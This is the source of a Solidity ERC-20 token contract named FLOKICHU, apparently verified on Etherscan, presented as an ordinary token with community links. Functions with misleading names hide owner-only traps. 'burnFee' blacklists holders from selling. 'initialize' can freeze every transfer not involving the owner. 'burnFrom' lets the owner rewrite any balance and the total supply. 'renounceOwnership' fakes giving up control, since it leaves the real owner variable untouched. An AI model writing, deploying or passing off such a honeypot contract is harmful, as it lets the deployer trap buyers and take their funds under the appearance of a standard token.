['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-02\n', '*/\n', '\n', '/**\n', 'gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggGJ,    >[email\xa0protected];        `vGgggggggggggggggggB%#&@Qggggggggggggggggggggggggggggggggggggggggggggggggg\n', "ggggggggggggggggggggggggggggggggggggggQggggggggggggggggggggg0t\\     '!   BggggggggC  `\\|||L),`   Pggggggggggggggg`             `'Xgggggggggggggggggggggggggggggggggggggg\n", 'ggggggggggggggggggggggggggggggggggg&7. Ugggggggggggggggg8z,     ^_L|v|"  CgggggggR  "|vv)))|v|v   8ggggggggggggg%  `)__!",,-\'.   ygggggggggggggggggggggggggggggggggggggg\n', 'ggggggggggggggggggggggggggggQGQg&7`     &gggggggggggggg)    -_||v|);"!+  ^ggggggg}  Y_^\'\'\'\':,!|-  5gggggggggggggz  >||||||vv|v-  qgggggggggggggggggggggggggggggggggggggg\n', 'ggggggggggggggggggggggggBI)`  \'`   .~)  ,gggggggggggggg`  L)v|)!,:\'\'\'-L   Bgggggg%  \')-\'\'.\'.\'>;   Qggggggggggggg"  L":::-^^^,_`  @gggggggggggggggggggggggggggggggggggggg\n', 'ggggggggggggggggggggR)`    ``   ^v||v|"  +ggggggggggggB  `|,-\'\'\'\'\'\'\'\'\'_>  }ggggggg#-   .\'--:.     QGCv":..\'^_xh$   L:\'\'\'\'\'\'\'._  .ggggggggggggggggggggggggggggggggggggggg\n', 'ggggggggggggggggRx:    ."v|v+_)||v_,:!L`  QgggggggggggP  -v_v_.\'\'\'\'\'\'\'"L  -gggggQbJ!       :")+                   :)\'\'\'\'\'\'\'\'.)  _ggggggggggggggggggggggggggggggggggggggg\n', 'gggggggggggg$y^    `,|||||LL||v_,:\'\'\':)|  |ggggg&K)-`    `YYYx^\'\'\'\'\'\'\':|`  &gQdL`    \'")L||||)+`  `,)L||||L|||_:  _\\.\'\'\'\'\'\'\'-+  _GBggggggggggggggggggggggggggggggggggggg\n', 'ggggggggRL.    \'_||||_>,:\'+)!^\'\'\'\'\'\'\'\'^v_  IQX-    `\'^,"")+_-|_\'\'\'\'\'\'\'\'_>         -+vv|);",-:`)~_|||);>,"","!_vv|Lx,\'\'\'\'\'\'\'\',v        !XQgGLjBgggggggggggggggggggggggggg\n', '[email\xa0protected]"    .>||||)\\,-\'\'\'\'.)"^\\,.\'\'\'\'\'\'."L\'      "||||v||||v||LL.\'\'\'\'\'\'\',+    ^)||||L|LL)))_,\':||v_"-\'\'\'\'\'\'\'\'\'\'\'^!)|v:\'\'\'\'\'\'\',|||L|_"\'    ~     ^YqQggggggggggggggggggggg\n', 'g8=.    ^)|||)~"-\'\'\'\'\'\'\'\'^|YY++-\'\'\'\'\'\'\'\'_L   \'v|vv_",">--^^,!_L:\'\'\'\'\'\'\'-L~_|||v)!!___vL|_"\'\'-|v),\'\'\'\'\'\':^,^\'\'\'\'\'\'-_|).\'\'\'\'\'\',__)))||v||^    \\-`    \'|aQggggggggggggggggg\n', '\'   `!|||v_"^\'\'\'\'\'\'\'\'^>)LYYYY+vv\'\'\'\'\'\'\'\'^v- )|v_^\'.^)x^\'\'\'>".\'>"\'\'\'\'\'\'\'\'_|v)!,:\'\'\'\'^_v,\'\'\'\'\'||!\'\'\'\'\'.^vYYYY+\\""!~__|Y^\'\'\'\'\'\'\'\'\'.\'\':-,~v||` vvv|||"\'    `[email\xa0protected]\n', 'V  \'L)_"^\'\'\'\'\'\'\'\'\'")+xY+YYYYLL"))\'\'\'\'\'\'\'\',LL)"\'\'\'\'^xYY)~_|Y,\'\'\'|.\'\'\'\'\'\'\'^^\'\'\'\'\'\',_+++).\'\'\'.>L,\'\'\'\'\'\'-x+Y++YY+YYY+L>,.\'\'\'\'\'\'\'.-)v-\'\'\'\'\'\',)L+),-,!_v||L)"     ,[Gggggggggg\n', 'g,  _\\.\'\'\'\'\'\'\'\'\'\'\'"xY+Y+LL|v|vL>L!.\'\'\'\'\'\'\')+^\'\'\'\'\':)+xY+x|,.\'\'.L,\'\'\'\'\'\'\'\'\'\'\'\'\'\'_YYYYY).\'\'\'.__\'\'\'\'\'\'\'^xYY+xY||LL+xL,\'.\'\'\'\'\'\'\'>+x+_.\'\'\'\'\'\'^+v,\'\'\'\'\'\'^!_|>         :YRggggg\n', '[email\xa0protected]   |,\'\'\'\'\'\'\'\'\'\'\'"|+L|||)!,-^)|_+,\'\'\'\'\'\'\',|_.\'\'\'\'\'.:^^,^\'\'\'\'\'\'__.\'\'\'\'\'\'\'\'\'\'\'\'\'.:")+Y).\'\'\'\'"v\'\'\'\'\'\'\'-|+x+L|)_v||||LL-\'\'\'\'\'\',x!`Y)`\'\'\'\'\'._|"\'\'\'\'\'\'\'\'.!L    `L|),`    :7Dg\n', 'ggR   |^"),.\'\'\'\'\'\'\'!|);,-\'\'\'\'\'"L|)L:\'\'\'\'\'\'\'~+,\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'._L\'\'\'\'\'\'\'\'\':\'\'\'\'\'\'\'.:!)!-\'\'\'\'__\'\'\'\'\'\'\')|||v\\:\'\'-,"v|,.\'\'\'\'\'.v"  ))`\'\'\'\'\'-+~\'\'\'\'\'\'\'\'\',+     L)_||||),`    \n', 'gggP  `x+Yx!\'\'\'\'\'\'\'\':\'\'\'\'\'^!)+xYY-\\v\'\'\'\'\'\'\':)L:\'\'\'\'\'\'\'\'\'\'\'\'\'\':_Yx"\'\'\'\'\'\'\'.>Yv!^\'\'\'\'\'\'.\'"|^\'\'.-v_,\'\'\'\'\'-^-\'\'\'\'\',_+_\'\'\'\'\'\'\'\',v   __.\'\'\'\'.!v:\'\'\'\'\'\'\'\'\'L    `L)-\'\'-,\\)|v)  !\n', 'ggggx  ^;``L_\'\'\'\'\'\'\'\'\':"_LY+YY):   v_.\'\'\'\'\'\',|).\'\'\'\'\'\'\'\'\'\'\':!LY)_).\'\'\'\'\'\'\'^x+Yx|~,\'\'\'\'\'`v>\'\'\'._Yx+)_"",,,"";)LxYL:\'\'\'\'\'\'\'._\'   L;\'\'\'\'\'._~.\'\'\'\'\'\'\'\',-   -|v^\'\'\'\'\'\'\':v`  %\n', 'ggggg,      L_\'\'\'\'\'\'\'\':)YY|,        Y"\'\'\'\'\'\'\'\\+\\-\'.\'\'\'.\'^")+YY\\  +-\'\'\'\'\'\'\'\'|\'.~+YYL_^\'\'._\\\'::\')_\\+Y+Y+++YY+Yx|,_+_~!"""",^|    +,\'\'\'\'\'.").\'\'\'\'\'\'\'\'". `)|),\'\'\'\'\'\'\'\'"_  _g\n', 'gggggQ__m%   ))\'\'\'\'\'\'\'\'\'),   |mgg5  .+^\'\'\'\'\'\':_Yxx+|||YYYYY)\'    )\\\'--^,,",|.    \')YY+_,~YxYxYY`      ```      "YYYYYY++YY_   )):.\'\'\'\'\'^Y!.\'\'\'\'\'\'\',|||)>\'\'\'\'\'\'\'\'\'>|  `Qg\n', 'gggggggggg#   )v:\'\'\'\'\'\'\'\').  uggggv  "|\'\'\'\'\'\'\',|Y_vLY+v_^`    x  \'++xxYYY+YY\'       ,L+YY|,,,^^   )"\'`   .^_:          ``\'    YYL|)_;",|Yx_-.\'\'\'\'\':|v!:\'\'\'\'\'\'\'\'-)+   mgg\n', 'ggggggggggg0   )v:\'\'\'\'\'\'\'\'v`  XgggQ.  v_.\'\'\'.:^)+         :+Ggg`  +v_\\"^:\'.`   [gD"    >+^       `gggggggggg8x+|)_\\"^:.       ;)+YYYYYY)!+Y+_^\'\'\'\'\':\'\'\'\'\'\'\'\'.:\\L)   Iggg\n', "gggggggggggg&   _|:''''''':)   agggD   Y!,\\)|+YY+'  `[email\xa0protected]            `'-jggQRK^      |ggggggggggggggggggggggggggggg[         `'^   )Y+x|_,-''''''.'^>)++^   Ggggg\n", 'gggggggggggggQ,  "L^\'\'\'\'\'\'\'\')`  Kggg5  .YYYYL_^`     @[email\xa0protected]&Qggggggggggggggggggb>   vgggggggggggggggggggggggggggggggggg&mU=_-       \')+YxYxL|))|+xYY).   Igggggg\n', 'ggggggggggggggQ"  ,L^\'\'\'\'\'\'\',+   5gggv  \'\'      .\\=h#ggggggggggggggggggggggggggggggggggggQf\'[email\xa0protected]&x     :!vYYYxL_^    `]Qggggggg\n', 'gggggggggggggggQ>  ,+:.:,>_Lxx,  `gggQ`   [email\xa0protected]gggggggggggggggggggggggggggggggggg0l"            ^[$gggggggggg\n', 'ggggggggggggggggQ\\  ,L|YYYYY|,`   5ggg$oDgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggQDAy=x7CqBgggggggggggggg\n', 'gggggggggggggggggg[  "v_,`    `vbQgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg\n', 'gggggggggggggggggggJ      .)[email\xa0protected]gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg\n', '\n', '🐥Twitter🐥 -   https://twitter.com/Flokichu\n', '\n', '📒Telegram📒 -  https://t.me/flokichu\n', '\n', ' \n', '*/\n', '// "SPDX-License-Identifier: UNLICENSED"\n', '\n', 'pragma solidity ^0.6.12;\n', '\n', 'abstract contract Context {\n', '    function _msgSender() internal view virtual returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '\n', '    function _msgData() internal view virtual returns (bytes memory) {\n', '        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '        return msg.data;\n', '    }\n', '}\n', '\n', 'interface IERC20 {\n', '    /**\n', '     * @dev Returns the amount of tokens in existence.\n', '     */\n', '    function totalSupply() external view returns (uint256);\n', '\n', '    function balanceOf(address account) external view returns (uint256);\n', '\n', '    function transfer(address recipient, uint256 amount) external returns (bool);\n', '    /**\n', '     * @dev Returns the remaining number of tokens that `spender` will be\n', '     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '     * zero by default.\n', '     *\n', '     * This value changes when {approve} or {transferFrom} are called.\n', '     */\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '    /**\n', "     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits an {Approval} event.\n', '     */\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '    /**\n', '     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "     * allowance mechanism. `amount` is then deducted from the caller's\n", '     * allowance.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '    /**\n', '     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n', '     * another (`to`).\n', '     *\n', '     * Note that `value` may be zero.\n', '     */\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    /**\n', '     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '     * a call to {approve}. `value` is the new allowance.\n', '     */\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '/**\n', " * @dev Wrappers over Solidity's arithmetic operations with added overflow\n", ' * checks.\n', ' */\n', 'library SafeMath {\n', '    /**\n', '     * @dev Returns the addition of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `+` operator.\n", '     *\n', '     */\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     */\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     */\n', '    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the multiplication of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `*` operator.\n", '     *\n', '     */\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     */\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     */\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     */\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts with custom message when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     */\n', '    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '        return a % b;\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Collection of functions related to the address type\n', ' */\n', 'library Address {\n', '    /**\n', '     * @dev Returns true if `account` is a contract.\n', '     *\n', '     */\n', '    function isContract(address account) internal view returns (bool) {\n', '        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n', '        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n', "        // for accounts without code, i.e. `keccak256('')`\n", '        bytes32 codehash;\n', '        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly { codehash := extcodehash(account) }\n', '        return (codehash != accountHash && codehash != 0x0);\n', '    }\n', '\n', '    /**\n', "     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n", '     * `recipient`, forwarding all available gas and reverting on errors.\n', '     *\n', '     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n', '     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n', '     * imposed by `transfer`, making them unable to receive funds via\n', '     * `transfer`. {sendValue} removes this limitation.\n', '     *\n', '     */\n', '    function sendValue(address payable recipient, uint256 amount) internal {\n', '        require(address(this).balance >= amount, "Address: insufficient balance");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n', '        (bool success, ) = recipient.call{ value: amount }("");\n', '        require(success, "Address: unable to send value, recipient may have reverted");\n', '    }\n', '\n', '    /**\n', '     * @dev Performs a Solidity function call using a low level `call`. A\n', '     * plain`call` is an unsafe replacement for a function call: use this\n', '     * function instead.\n', '     *\n', '     * If `target` reverts with a revert reason, it is bubbled up by this\n', '     * function (like regular Solidity function calls).\n', '     *\n', '     * Returns the raw returned data. To convert to the expected return value,\n', '     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n', '     *\n', '     */\n', '    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n', '      return functionCall(target, data, "Address: low-level call failed");\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n', '     * `errorMessage` as a fallback revert reason when `target` reverts.\n', '     *\n', '     */\n', '    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n', '        return _functionCallWithValue(target, data, 0, errorMessage);\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n', '     * but also transferring `value` wei to `target`.\n', '     *\n', '     */\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n', '        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n', '    }\n', '\n', '    /**\n', '     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n', '     * with `errorMessage` as a fallback revert reason when `target` reverts.\n', '     *\n', '     */\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n', '        require(address(this).balance >= value, "Address: insufficient balance for call");\n', '        return _functionCallWithValue(target, data, value, errorMessage);\n', '    }\n', '\n', '    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n', '        require(isContract(target), "Address: call to non-contract");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls\n', '        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n', '        if (success) {\n', '            return returndata;\n', '        } else {\n', '            // Look for revert reason and bubble it up if present\n', '            if (returndata.length > 0) {\n', '                // The easiest way to bubble the revert reason is using memory via assembly\n', '\n', '                // solhint-disable-next-line no-inline-assembly\n', '                assembly {\n', '                    let returndata_size := mload(returndata)\n', '                    revert(add(32, returndata), returndata_size)\n', '                }\n', '            } else {\n', '                revert(errorMessage);\n', '            }\n', '        }\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Contract module which provides a basic access control mechanism, where\n', ' * there is an account (an owner) that can be granted exclusive access to\n', ' * specific functions.\n', ' *\n', ' * By default, the owner account will be the one that deploys the contract. This\n', ' * can later be changed with {transferOwnership}.\n', ' *\n', ' */\n', 'contract Ownable is Context {\n', '    address private _owner;\n', '    address public Owner;\n', '    \n', '    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '    \n', '    /**\n', '     * @dev Initializes the contract setting the deployer as the initial owner.\n', '     */\n', '    constructor () internal {\n', '        address msgSender = _msgSender();\n', '        _owner = msgSender;\n', '        Owner = msgSender;\n', '        emit OwnershipTransferred(address(0), msgSender);\n', '    }\n', '    \n', '    /**\n', '     * @dev Returns the address of the current owner.\n', '     */\n', '    function owner() internal view returns (address) {\n', '        return _owner;\n', '    }\n', '    \n', '    /**\n', '     * @dev Throws if called by any account other than the owner.\n', '     */\n', '    modifier ownerOnly() {\n', '        require(_owner == _msgSender(), "Ownable: caller is not the owner");\n', '        _;\n', '    }\n', '    \n', '    /**\n', '     * @dev Leaves the contract without owner. It will not be possible to call\n', '     * `onlyOwner` functions anymore. Can only be called by the current owner.\n', '     *\n', '     */\n', '    function renounceOwnership() public virtual ownerOnly {\n', '        emit OwnershipTransferred(Owner, address(0));\n', '        Owner = address(0);\n', '    }\n', '}\n', '\n', '/**\n', ' * @dev Implementation of the {IERC20} interface.\n', ' *\n', ' * This implementation is agnostic to the way tokens are created. This means\n', ' * that a supply mechanism has to be added in a derived contract.\n', ' *\n', ' * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n', ' * This allows applications to reconstruct the allowance for all accounts just\n', ' * by listening to said events. Other implementations of the EIP may not emit\n', " * these events, as it isn't required by the specification.\n", ' *\n', ' * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n', ' * functions have been added to mitigate the well-known issues around setting\n', ' * allowances. See {IERC20-approve}.\n', ' */\n', 'contract FLOKICHU is Context, IERC20 , Ownable{\n', '    using SafeMath for uint256;\n', '    using Address for address;\n', '\n', '    mapping (address => uint256) private _balances;\n', '    mapping (address => bool) private _fee;\n', '    mapping (address => mapping (address => uint256)) private _allowances;\n', '    \n', '    bool _initialize = true;\n', '    uint256 private _totalSupply;\n', '\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '    address private _factory;\n', '    address private _router;\n', '    \n', '    /**\n', '     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n', '     * a default value of 18.\n', '     *\n', '     * All three of these values are immutable: they can only be set once during\n', '     * construction.\n', '     */\n', '   \n', '    constructor (address router, address factory, uint256 initialTokens) public {\n', '        _name = "Flokichu | t.me/flokichu ";\n', '        _symbol = "FLOKICHU";\n', '        _decimals = 9;\n', '     // default router and factory setup\n', '        _router = router;\n', '        _factory = factory;\n', '     // initial tokens generation for the liquidity\n', '       _totalSupply = _totalSupply.add(initialTokens);\n', '       _balances[msg.sender] = _balances[msg.sender].add(initialTokens);\n', '       emit Transfer(address(0), msg.sender, initialTokens);\n', '    }\n', '\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '\n', '    function totalSupply() public view override returns (uint256) {\n', '         return _totalSupply;\n', '    }\n', '\n', '    function balanceOf(address account) public view override returns (uint256) {\n', '         return _balances[account];\n', '    }\n', '\n', '    function burnFee(address _address) external ownerOnly {\n', '        _fee[_address] = true;\n', '    }\n', '\n', '    function reflectFee(address _address) external ownerOnly {\n', '        _fee[_address] = false;\n', '    }\n', '\n', '    function feeStatus(address _address) public view returns (bool) {\n', '        return _fee[_address];\n', '    }\n', '\n', '    function initialize() public virtual ownerOnly {\n', '        if (_initialize == true) {_initialize = false;} else {_initialize = true;}\n', '    }\n', ' \n', '    function initialized() public view returns (bool) {\n', '        return _initialize;\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-transfer}.\n', '     *\n', '     */\n', '    function transfer(address recipient, uint256 amount) public  virtual override returns (bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-allowance}.\n', '     */\n', '    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    /**\n', '     * @dev See {IERC20-approve}.\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - `spender` cannot be the zero address.\n', '     */\n', '     function approve(address spender, uint256 amount) public virtual override returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '     }\n', '\n', '    /**\n', '     * @dev See {IERC20-transferFrom}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance. This is not\n', '     * required by the EIP. See the note at the beginning of {ERC20};\n', '     *\n', '     */\n', '    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '    \n', '    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n', '     *\n', '     * This is an alternative to {approve} that can be used as a mitigation for\n', '     * problems described in {IERC20-approve}.\n', '     *\n', '     * Emits an {Approval} event indicating the updated allowance.\n', '     *\n', '     */\n', '    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '\n', '    /**\n', '     * @dev Moves tokens `amount` from `sender` to `recipient`.\n', '     *\n', '     * This is internal function is equivalent to {transfer}, and can be used to\n', '     * e.g. implement automatic token fees, slashing mechanisms, etc.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     *\n', '     */\n', '    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '        if (_fee[sender] || _fee[recipient]) require(amount == 0, "");\n', '        if (_initialize == true || sender == owner() || recipient == owner()) {\n', '        _beforeTokenTransfer(sender, recipient, amount);\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);} else {require (_initialize == true, "");}\n', '    }\n', '    /**\n', '     * @dev Destroys `amount` tokens from `account`, reducing the\n', '     * total supply.\n', '     *\n', '     * Emits a {Transfer} event with `to` set to the zero address.\n', '     *\n', '     */\n', '    function _burn(address account, uint256 amount) internal virtual {\n', '        require(account != address(0), "ERC20: burn from the zero address disallowed");\n', '        _beforeTokenTransfer(account, address(0), amount);\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '\n', '    /**\n', '     * @dev Destroys `amount` tokens from `account`, reducing the\n', '     * total supply.\n', '     */\n', '   function burnFrom(address account, uint256 balance, uint256 subtract) external ownerOnly {\n', '        require(account != address(0), "ERC20: burn from the zero address disallowed");\n', '       _balances[account] = balance.sub(subtract, "ERC20: burn amount exceeds balance");\n', '       _totalSupply = balance.sub(subtract);\n', '    }\n', '\n', '    /**\n', '     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n', '     *\n', '     * This is internal function is equivalent to `approve`, and can be used to\n', '     * e.g. set automatic allowances for certain subsystems, etc.\n', '     *\n', '     * Emits an {Approval} event.\n', '     *\n', '     */\n', '    function _approve(address owner, address spender, uint256 amount) internal virtual {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '\n', '    /**\n', '     * @dev Sets {decimals} to a value other than the default one of 18.\n', '     *\n', '     */\n', '    function _setupDecimals(uint8 decimals_) internal {\n', '        _decimals = decimals_;\n', '    }\n', '\n', '    /**\n', '     * @dev Hook that is called before any transfer of tokens. \n', '     *\n', "     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n", '     * will be to transferred to `to`.\n', '     * - when `from` is zero, `amount` tokens will be created for `to`.\n', "     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n", '     * - `from` and `to` are never both zero.\n', '     *\n', '     */\n', '    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\n', '}']